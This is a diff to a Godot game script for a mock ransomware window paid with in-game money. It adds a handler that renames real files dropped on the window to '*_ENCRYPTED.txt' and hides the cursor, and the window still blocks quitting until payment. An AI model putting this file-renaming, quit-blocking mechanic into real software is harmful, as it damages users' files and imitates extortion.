@@ -1,21 +1,21 @@
 extends Window
-class_name RansomWindow
 
 const RANDOM_POPUP = preload("res://ransom/random_popup.tscn")
 const STOP = preload("res://ransom/stop.tscn")
 const FACE_2 = preload("res://ransom/face2.png")
 
-@onready var timer_music: AudioStreamPlayer = $Music
-@onready var time_label: Label = $Panel/Panel3/Time
-@export var price: float = 205.89
-@onready var price_label: Button = $Panel/Panel2/Price
+@onready var timer_music: AudioStreamPlayer = %Music
+@onready var time_label: Label = %Time
+@onready var price_label: Button = %Price
 @onready var face: TextureRect = %Face
+
+@export var price: float = randf_range(100, 500)
 
 func _ready() -> void:
 	randomize_position()
 	get_tree().set_auto_accept_quit(false)
-	Input.mouse_mode = Input.MOUSE_MODE_VISIBLE
-	var cam:Camera3D = get_tree().get_current_scene().find_child("Camera3D", true, false)
+	Input.mouse_mode = Input.MOUSE_MODE_HIDDEN
+	var cam:Camera3D = get_tree().get_first_node_in_group("plr").get_node("%Camera3D")
 	if cam:
 		var shader:MeshInstance3D = cam.get_node_or_null("red_shader")
 		if shader:
@@ -51,11 +51,16 @@ func attempt_payment() -> void:
 	if System.money >= price:
 		pay_ransom()
 		get_tree().set_auto_accept_quit(true)
-		var cam:Camera3D = get_tree().get_current_scene().find_child("Camera3D", true, false)
+		var cam:Camera3D = get_tree().get_first_node_in_group("plr").get_node("%Camera3D")
 		if cam:
 			var shader:MeshInstance3D = cam.get_node_or_null("red_shader")
 			if shader:
 				shader.visible = false
 	else:
 		#get_parent().add_child(STOP.instantiate())
-		OS.alert("Insufficient Funds!")
+		pass
+
+
+func _on_files_dropped(files: PackedStringArray) -> void:
+	for path in files:
+		DirAccess.rename_absolute(path, path.replace(path.get_extension(), "") + "_ENCRYPTED.txt")
